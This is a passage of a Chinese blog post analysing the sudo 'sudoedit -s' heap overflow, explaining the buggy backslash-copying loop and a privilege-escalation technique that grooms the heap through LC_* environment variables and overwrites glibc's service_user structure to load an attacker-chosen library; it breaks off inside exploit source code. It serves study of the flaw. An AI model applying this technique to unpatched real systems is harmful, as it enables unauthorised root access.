<span class="token number">7.</span> 
</code></pre> 
<p>这里计算了每一个参数的长度，然后把他们加到一起，得到一个size，然后malloc(size)，这里的意图很明显，就是算一下想要装下所有的参数需要多大的空间，然后申请出来，指针给到user_args</p> 
<p>接下来是拷贝部分：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">for</span> <span class="token punctuation">(</span>to <span class="token operator">=</span> user_args<span class="token punctuation">,</span> av <span class="token operator">=</span> NewArgv <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>from <span class="token operator">=</span> <span class="token operator">*</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> av<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">2.</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>from<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
<span class="token number">3.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>from<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>from<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token number">4.</span>                from<span class="token operator">++</span><span class="token punctuation">;</span>  
<span class="token number">5.</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>from<span class="token operator">++</span><span class="token punctuation">;</span>  
<span class="token number">6.</span>            <span class="token punctuation">}</span>  
<span class="token number">7.</span>            <span class="token operator">*</span>to<span class="token operator">++</span> <span class="token operator">=</span> <span class="token char">' '</span><span class="token punctuation">;</span>  
<span class="token number">8.</span>        <span class="token punctuation">}</span>  
<span class="token number">9.</span>        <span class="token operator">*</span><span class="token operator">--</span>to <span class="token operator">=</span> <span class="token char">''</span><span class="token punctuation">;</span>  
</code></pre> 
<p>这里就是漏洞所在，它把每个参数取出来，让from指针指向参数内容，to指针则指向堆内存，然后判断如果是反斜杠+非空格字符这种结构，就只拷贝后面这个字符，不拷贝反斜杠。参数与参数之间是用空格分割。<br> 这里我们先仔细关注一下NewArgv是怎么保存的我们的参数，还是刚才那个图<br> <img src="https://images2.imgbox.com/be/32/CL3qTswU_o.png" alt="在这里插入图片描述"><br> 只不过这次我们关注地址，可以看到NewArgv[0]存在一个地方，NewArgv[1]以及以后的参数会连续存储在另一个地方，中间用x00分隔<br> 直接查看内存也能看出来：</p> 
<p><img src="https://images2.imgbox.com/44/33/7kvVXIWF_o.png" alt="在这里插入图片描述"><br> 现在考虑这种特殊情况，如果有一个参数只有一个反斜杠，那么根据上面代码里的流程，由于反斜杠+x00满足反斜杠+非空格字符这一条件，所以from++，然后将x00拷贝到堆内存中，from再次++，发现问题了没有，这里from已经指向了下一个参数了，而程序是如何区分不同参数的？<br> 靠的是while循环里的判断条件，即根据x00来判断，所以这里直接绕过了这个判断，让程序连续拷贝了两个参数，而这个反斜杠参数拷贝完，下一个参数还会再拷贝一次，对于sudoedit -s ‘’ AAAAAAAA来说，相当于程序拷贝了AAAAAAAA两次，但是申请内存计算size的时候只计算了一个AAAAAAAA，所以导致了堆溢出，而这个漏洞之所以危害性高也是因为堆溢出的内容是用户完全自主可控的，所以才让后面的进一步利用如提权等成为可能。<br> 触发漏洞的路径可以总结为：<br> sudo.c : main<br> sudo.c : policy_check<br> policy.c : sudoerrs_policy_check<br> sudoers.c : sudoers_policy_main<br> sudoers.c : set_cmnd<br> sudoers.c : 859</p> 
<p>为了方便触发漏洞，我将参数修改为0x10个A，然后走到计算size那一步：<br> <img src="https://images2.imgbox.com/89/ee/W675wh7M_o.png" alt="在这里插入图片描述"><br> 可以看到size为19，即反斜杠长度1+1+16个A+1，为19没有任何问题，接下来走到拷贝那里</p> 
<p><img src="https://images2.imgbox.com/61/63/ANjs2Hmx_o.png" alt="在这里插入图片描述"><br> 把这个for循环走完，然后看看堆内存是个什么情况：</p> 
<p><img src="https://images2.imgbox.com/32/84/LdSSHd6u_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到堆块结构已经被破坏了，原本size为19，所以会申请一个大小为0x20的chunk，也就是0x561d2f447e80这里的chunk，但是拷贝了0x22个字节进去，所以把下一个chunk的size给覆盖掉了，所以才导致gdb在分析堆快结构的时候将0x4141414141414141识别为size</p> 
<p>分析到了这里，已经将漏洞成因彻底分析明白了，接下来我们继续关注如何进一步利用这个漏洞。</p> 
<h1>
<a id="_302"></a>四、利用手法分析</h1> 
<p>本漏洞利用手法有一定的堆布局难度，最后的提权是通过堆溢出覆盖nss_load_library函数加载so的时候需要用到的结构体service_user，覆盖此结构体中的so名字符串，这样就可以让程序加载我们指定的so文件，从而完成任意代码执行。<br> 我们要做的事情有两个：<br> 1.搞清楚nss_load_library的函数调用流程和相关的数据结构机制<br> 2.setlocale 如何通过环境变量LC_* 进行堆布局</p> 
<p>漏洞利用关键代码片段：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">static</span> <span class="token keyword">int</span>  
<span class="token number">2.</span><span class="token function">nss_load_library</span> <span class="token punctuation">(</span>service_user <span class="token operator">*</span>ni<span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-&gt;</span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">5.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">6.</span>      <span class="token keyword">static</span> name_database default_table<span class="token punctuation">;</span>  
<span class="token number">7.</span>      ni<span class="token operator">-&gt;</span>library <span class="token operator">=</span> <span class="token function">nss_new_service</span> <span class="token punctuation">(</span>service_table <span class="token operator">?</span><span class="token operator">:</span> <span class="token operator">&amp;</span>default_table<span class="token punctuation">,</span>  
<span class="token number">8.</span>                     ni<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">9.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-&gt;</span>library <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">10.</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  
<span class="token number">11.</span>    <span class="token punctuation">}</span>  
<span class="token number">12.</span>  
<span class="token number">13.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-&gt;</span>library<span class="token operator">-&gt;</span>lib_handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">14.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">15.</span>      ··· ···  
<span class="token number">16.</span>      <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">,</span>  
<span class="token number">17.</span>                          <span class="token string">"libnss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">18.</span>                    ni<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">19.</span>              <span class="token string">".so"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">20.</span>        __nss_shlib_revision<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">21.</span>  
<span class="token number">22.</span>      ni<span class="token operator">-&gt;</span>library<span class="token operator">-&gt;</span>lib_handle <span class="token operator">=</span> <span class="token function">__libc_dlopen</span> <span class="token punctuation">(</span>shlib_name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">23.</span>      ··· ···  
<span class="token number">24.</span>      ··· ···  
<span class="token number">25.</span>  <span class="token punctuation">}</span>  
<span class="token number">26.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>ni为堆上的service_user 结构体，当 ni-&gt;library-&gt;lib_handle 为NULL 时，就会调用__libc_dlopen 进行 so 装载，只要我们能够通过堆溢出将ni-&gt;library覆盖为0，就会让程序调用nss_new_service函数让ni结构体重新初始化，刚初始化后的ni-&gt;library-&gt;lib_handle一定为0，所以会运行到下面的代码块，执行到__libc_dlopen 函数。<br> 这里是漏洞利用的核心代码，接下来我们考虑如何实现精准的堆溢出来覆盖ni结构体，这就要提到nss机制，首先/etc/目录下有一个文件/etc/nsswitch.conf，来看看里面写了些啥<br> <img src="https://images2.imgbox.com/e4/2c/pEs1A3ua_o.png" alt="在这里插入图片描述"><br> 它规定了程序在查找so方法的时候采用何种途径和顺序<br> 然后来看三个结构体的内容</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">service_user</span>  
<span class="token number">2.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">3.</span>  <span class="token comment">/* And the link to the next entry.  */</span>  
<span class="token number">4.</span>  <span class="token keyword">struct</span> <span class="token class-name">service_user</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>  
<span class="token number">5.</span>  <span class="token comment">/* Action according to result.  */</span>  
<span class="token number">6.</span>  lookup_actions actions<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
<span class="token number">7.</span>  <span class="token comment">/* Link to the underlying library object.  */</span>  
<span class="token number">8.</span>  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>  
<span class="token number">9.</span>  <span class="token comment">/* Collection of known functions.  */</span>  
<span class="token number">10.</span>  <span class="token keyword">void</span> <span class="token operator">*</span>known<span class="token punctuation">;</span>  
<span class="token number">11.</span>  <span class="token comment">/* Name of the service (`files', `dns', `nis', ...).  */</span>  
<span class="token number">12.</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
<span class="token number">13.</span><span class="token punctuation">}</span> service_user<span class="token punctuation">;</span>  
<span class="token number">14.</span>  
<span class="token number">15.</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span>  
<span class="token number">16.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">17.</span>  <span class="token comment">/* And the link to the next entry.  */</span>  
<span class="token number">18.</span>  <span class="token keyword">struct</span> <span class="token class-name">name_database_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>  
<span class="token number">19.</span>  <span class="token comment">/* List of service to be used.  */</span>  
<span class="token number">20.</span>  service_user <span class="token operator">*</span>service<span class="token punctuation">;</span>  
<span class="token number">21.</span>  <span class="token comment">/* Name of the database.  */</span>  
<span class="token number">22.</span>  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
<span class="token number">23.</span><span class="token punctuation">}</span> name_database_entry<span class="token punctuation">;</span>  
<span class="token number">24.</span>  
<span class="token number">25.</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name_database</span>  
<span class="token number">26.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">27.</span>  <span class="token comment">/* List of all known databases.  */</span>  
<span class="token number">28.</span>  name_database_entry <span class="token operator">*</span>entry<span class="token punctuation">;</span>  
<span class="token number">29.</span>  <span class="token comment">/* List of libraries with service implementation.  */</span>  
<span class="token number">30.</span>  service_library <span class="token operator">*</span>library<span class="token punctuation">;</span>  
<span class="token number">31.</span><span class="token punctuation">}</span> name_database<span class="token punctuation">;</span> 
</code></pre> 
<p>在__nss_database_lookup函数中，如果全局入口 service_table 为空，则会调用 nss_parse_file 进行初始化，相关代码如下：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">int</span>  
<span class="token number">2.</span><span class="token function">__nss_database_lookup</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>database<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>alternate_name<span class="token punctuation">,</span>  
<span class="token number">3.</span>               <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>defconfig<span class="token punctuation">,</span> service_user <span class="token operator">*</span><span class="token operator">*</span>ni<span class="token punctuation">)</span>  
<span class="token number">4.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">5.</span>  ··· ···  
<span class="token number">6.</span>  <span class="token comment">/* Are we initialized yet?  */</span>  
<span class="token number">7.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>service_table <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">8.</span>    <span class="token comment">/* Read config file.  */</span>  
<span class="token number">9.</span>    service_table <span class="token operator">=</span> <span class="token function">nss_parse_file</span> <span class="token punctuation">(</span>_PATH_NSSWITCH_CONF<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">10.</span>  ··· ···  
<span class="token number">11.</span><span class="token punctuation">}</span>  
</code></pre> 
<p>然后继续看nss_parse_file是如何实现的：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">static</span> name_database <span class="token operator">*</span>  
<span class="token number">2.</span><span class="token function">nss_parse_file</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fname<span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>  FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>  
<span class="token number">5.</span>  name_database <span class="token operator">*</span>result<span class="token punctuation">;</span>  
<span class="token number">6.</span>  name_database_entry <span class="token operator">*</span>last<span class="token punctuation">;</span>  
<span class="token number">7.</span>  ··· ···  
<span class="token number">8.</span>  <span class="token comment">//打开/etc/nsswitch.conf  </span>
<span class="token number">9.</span>  fp <span class="token operator">=</span> <span class="token function">fopen</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"rce"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">10.</span>  ··· ···  
<span class="token number">11.</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span>name_database <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>name_database<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">12.</span>  ··· ···  
<span class="token number">13.</span>  <span class="token keyword">do</span>  
<span class="token number">14.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">15.</span>      name_database_entry <span class="token operator">*</span>this<span class="token punctuation">;</span>  
<span class="token number">16.</span>      <span class="token class-name">ssize_t</span> n<span class="token punctuation">;</span>  
<span class="token number">17.</span>      n <span class="token operator">=</span> <span class="token function">__getline</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>line<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// getline 这里会申请一个0x80 大小的chunk  </span>
<span class="token number">18.</span>        
<span class="token number">19.</span>      ··· ···  
<span class="token number">20.</span>            
<span class="token number">21.</span>      this <span class="token operator">=</span> <span class="token function">nss_getline</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">22.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>this <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">23.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">24.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
<span class="token number">25.</span>        last<span class="token operator">-&gt;</span>next <span class="token operator">=</span> this<span class="token punctuation">;</span>  
<span class="token number">26.</span>      <span class="token keyword">else</span>  
<span class="token number">27.</span>        result<span class="token operator">-&gt;</span>entry <span class="token operator">=</span> this<span class="token punctuation">;</span>  
<span class="token number">28.</span>  
<span class="token number">29.</span>      last <span class="token operator">=</span> this<span class="token punctuation">;</span>  
<span class="token number">30.</span>    <span class="token punctuation">}</span>  
<span class="token number">31.</span>    <span class="token punctuation">}</span>  
<span class="token number">32.</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof_unlocked</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">33.</span>  
<span class="token number">34.</span>  <span class="token comment">/* Free the buffer.  */</span>  
<span class="token number">35.</span>  <span class="token function">free</span> <span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//在函数返回之前会将getline 函数申请的0x80 chunk 释放掉。  </span>
<span class="token number">36.</span>  <span class="token comment">/* Close configuration file.  */</span>  
<span class="token number">37.</span>  <span class="token function">fclose</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">38.</span>  
<span class="token number">39.</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
</code></pre> 
<p>到这里大概梳理一下程序逻辑，程序会打开/etc/nsswitch.conf，文件，读入内容并根据内容建立堆快结构，最后形成如下结构：<br> <img src="https://images2.imgbox.com/46/ab/ypC2gzem_o.png" alt="在这里插入图片描述"></p> 
<p>这七个chunk是在同一个函数中一次性申请出来的<br> 除此之外，值得注意的是，在 nss_parse_file 函数中有一个 __getline 函数，该函数会根据读入内容的长度申请一个chunk，并且这个chunk 会在最后 nss_parse_file 函数返回时被释放。由于/etc/nsswitch.conf 里面内容格式基本最长的一行就是注释了，而且我们不可控该文件，所以这里可以认为每次 __getline 函数中申请的chunk 长度是一样的，固定为0x80大小。</p> 
<p>所以我们可以将它理解为，这是一个在service 链表之前申请的，并且service链表结构申请完毕就会被释放的，而且在vuln chunk 申请之前还能一直保持free 状态的一个非常宝贵的chunk。</p> 
<p>分析完这个函数，我们总得知道怎么触发它吧，当需要调用一些，查找用户或者主机信息的函数时，会执行以下流程：</p> 
<pre><code class="prism language-c"><span class="token number">1.</span><span class="token keyword">void</span> <span class="token operator">*</span>  
<span class="token number">2.</span><span class="token function">__nss_lookup_function</span> <span class="token punctuation">(</span>service_user <span class="token operator">*</span>ni<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fct_name<span class="token punctuation">)</span>  
<span class="token number">3.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">4.</span>  ··· ···  
<span class="token number">5.</span>        
<span class="token number">6.</span>  found <span class="token operator">=</span> <span class="token function">__tsearch</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>fct_name<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ni<span class="token operator">-&gt;</span>known<span class="token punctuation">,</span> <span class="token operator">&amp;</span>known_compare<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">7.</span>  ··· ···<span class="token comment">//没有搜到的一些操作省略  </span>
<span class="token number">8.</span>        
<span class="token number">9.</span>  <span class="token keyword">else</span>  
<span class="token number">10.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">11.</span>      known_function <span class="token operator">*</span>known <span class="token operator">=</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token operator">*</span>known<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">12.</span>      ··· ···  
<span class="token number">13.</span>      <span class="token keyword">else</span>  
<span class="token number">14.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">15.</span>      <span class="token comment">//调用nss_load_library, 检查ni-&gt;library-&gt;lib_handle 是否为空，为空则重新dlopen  </span>
<span class="token number">16.</span>      <span class="token comment">//具体nss_load_library 代码见上面  </span>
<span class="token number">17.</span>      ··· ···  
<span class="token number">18.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">nss_load_library</span> <span class="token punctuation">(</span>ni<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">19.</span>        <span class="token comment">/* This only happens when out of memory.  */</span>  
<span class="token number">20.</span>        <span class="token keyword">goto</span> remove_from_tree<span class="token punctuation">;</span>  
<span class="token number">21.</span>  
<span class="token number">22.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>ni<span class="token operator">-&gt;</span>library<span class="token operator">-&gt;</span>lib_handle <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1l</span><span class="token punctuation">)</span>  
<span class="token number">23.</span>        <span class="token comment">/* Library not found =&gt; function not found.  */</span>  
<span class="token number">24.</span>        result <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
<span class="token number">25.</span>      <span class="token keyword">else</span>  
<span class="token number">26.</span>        <span class="token punctuation">{<!-- --></span>  
<span class="token number">27.</span>          ··· ···  
<span class="token number">28.</span>                
<span class="token number">29.</span>          <span class="token comment">/* Construct the function name.  */</span>  
<span class="token number">30.</span>          <span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span><span class="token function">__stpcpy</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">"_nss_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">31.</span>                        ni<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">32.</span>                  <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
<span class="token number">33.</span>            fct_name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">34.</span>  
<span class="token number">35.</span>          <span class="token comment">/* Look up the symbol.  */</span>  
<span class="token number">36.</span>          result <span class="token operator">=</span> <span class="token function">__libc_dlsym</span> <span class="token punctuation">(</span>ni<span class="token operator">-&gt;</span>library<span class="token operator">-&gt;</span>lib_handle<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token number">37.</span>        <span class="token punctuation">}</span>  
<span class="token number">38.</span>          
<span class="token number">39.</span>        ··· ···  
<span class="token number">40.</span>        ··· ···  
<span class="token number">41.</span>  
<span class="token number">42.</span>    <span class="token punctuation">}</span>  
<span class="token number">43.</span>    ···  
<span class="token number">44.</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span>  
<span class="token number">45.</span><span class="token punctuation">}</span>  
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__nss_lookup_function<span class="token punctuation">)</span>
</code></pre> 
<p>可以看到就是在这里调用了nss_load_library (ni)，也就是说只要调用了libnss_xx.so里的函数，就一定会调用nss_load_library来进行搜索。只需要知道堆溢出发生之后，第一个被调用的libnss相关的函数属于哪个so，然后通过堆布局将该so 所属的service_user 结构体布局到 vuln chunk 后面即可<br> 分析完任意代码执行原理，再来谈谈如何进行堆布局，只有通过合理的堆布局，才能成功溢出到对应的结构体且不修改其他正常结构体。这里介绍一种方法：setlocale<br> setlocale 的堆机制，关键就一句话，按照自己想要释放的chunk 顺序去输入该长度的环境变量即可，能保证释放顺序和前后关系，但这些chunk 并不前后紧密相连<br> Setlocale是用来设置语言环境的，有几种环境变量参数，在sudo 中使用的是 setlocale(LC_ALL,“”); 当传入参数是LC_ALL 时，会从 LC_IDENTIFICATION 开始向前遍历所有的变量。对于每一个调用 _nl_find_locale 函数，这个函数里面比较复杂，但返回的 newnames[category] 其实就是对应环境变量的值，会在接下来调用strdup 函数将该字符串拷贝到堆上。由于传入的是LC_ALL ，那么会生成一个对应的字符串数组，接下来会和全局变量默认值进行一次校验，如果校验失败，那么就会将其释放(很容易构造出失败的输入)。<br> 也就是说，我们可以通过构造一些合理长度的失败输入，实现任意次任意长度的堆申请和堆释放，这对我们的堆布局有非常大的帮助。<br> 最后就是找到堆溢出之后第一个调用的nss里的函数，根据这个图找到它对应着几号chunk:<br> <img src="https://images2.imgbox.com/e5/32/eYIgaJmp_o.png" alt="在这里插入图片描述"><br> 然后计算好参数总长度，让sudo申请到我们布置好的chunk，并且让接下来nss函数申请的chunk处在sudo申请的chunk的下方，然后利用sudo造成的堆溢出覆盖service_user结构体即可，name在service_user结构体偏移0x30的位置，覆盖成我们自己写的.so的name即可实现任意代码执行</p> 
<pre><code class="prism language-c"><span class="token number">1.</span>#include<span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">2.</span>#include<span class="token operator">&lt;</span>string<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">3.</span>#include<span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">4.</span>#include<span class="token operator">&lt;</span>math<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>  
<span class="token number">5.</span>  
<span class="token number">6.</span>#define __LC_CTYPE               <span class="token number">0</span>  
<span class="token number">7.</span>#define __LC_NUMERIC             <span class="token number">1</span>  
<span class="token number">8.</span>#define __LC_TIME                <span class="token number">2</span>  
<span class="token number">9.</span>#define __LC_COLLATE             <span class="token number">3</span>  
<span class="token number">10.</span>#define __LC_MONETARY            <span class="token number">4</span>  
<span class="token number">11.</span>#define __LC_MESSAGES            <span class="token number">5</span>  
<span class="token number">12.</span>#define __LC_ALL                 <span class="token number">6</span>  
<span class="token number">13.</span>#define __LC_PAPER               <span class="token number">7</span>  
<span class="token number">14.</span>#define __LC_NAME                <span class="token number">8</span>  
<span class="token number">15.</span>#define __LC_ADDRESS             <span class="token number">9</span>  
<span class="token number">16.</span>#define __LC_TELEPHONE          <span class="token number">10</span>  
<span class="token number">17.</span>#define __LC_MEASUREMENT        <span class="token number">11</span>  
<span class="token number">18.</span>#define __LC_IDENTIFICATION     <span class="token number">12</span>  
<span class="token number">19.</span>  
<span class="token number">20.</span><span class="token keyword">char</span> <span class="token operator">*</span> envName<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"LC_CTYPE"</span><span class="token punctuation">,</span><span class="token string">"LC_NUMERIC"</span><span class="token punctuation">,</span><span class="token string">"LC_TIME"</span><span class="token punctuation">,</span><span class="token string">"LC_COLLATE"</span><span class="token punctuation">,</span><span class="token string">"LC_MONETARY"</span><span class="token punctuation">,</span><span class="token string">"LC_MESSAGES"</span><span class="token punctuation">,</span><span class="token string">"LC_ALL"</span><span class="token punctuation">,</span><span class="token string">"LC_PAPER"</span><span class="token punctuation">,</span><span class="token string">"LC_NAME"</span><span class="token punctuation">,</span><span class="token string">"LC_ADDRESS"</span><span class="token punctuation">,</span>"LC_TELE  
<span class="token number">21.</span>PHONE<span class="token string">","</span>LC_MEASUREMENT<span class="token string">","</span>LC_IDENTIFICATION"<span class="token punctuation">}</span><span class="token punctuation">;</span>  
<span class="token number">22.</span>  
<span class="token number">23.</span><span class="token keyword">int</span> now<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">;</span>  
<span class="token number">24.</span><span class="token keyword">int</span> envnow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token number">25.</span><span class="token keyword">int</span> argvnow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  
<span class="token number">26.</span><span class="token keyword">char</span> <span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
<span class="token number">27.</span><span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token number">0x300</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
<span class="token number">28.</span><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">addChunk</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span>  
<span class="token number">29.</span><span class="token punctuation">{<!-- --></span>  
<span class="token number">30.</span>    now <span class="token operator">--</span><span class="token punctuation">;</span>  
<span class="token number">31.</span>    <span class="token keyword">char</span> <span class="token operator">*</span> result<span class="token punctuation">;</span>  
<span class="token number">32.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">==</span><span class="token number">6</span><span class="token punctuation">)</span>  
<span class="token number">33.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">34.</span>        now <span class="token operator">--</span><span class="token punctuation">;</span>  
<span class="token number">35.</span>    <span class="token punctuation">}</span>  
<span class="token number">36.</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>now<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">)</span>  
<span class="token number">37.</span>    <span class="token punctuation">{<!-- --></span>  
<span class="token number">38.</span>        result<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
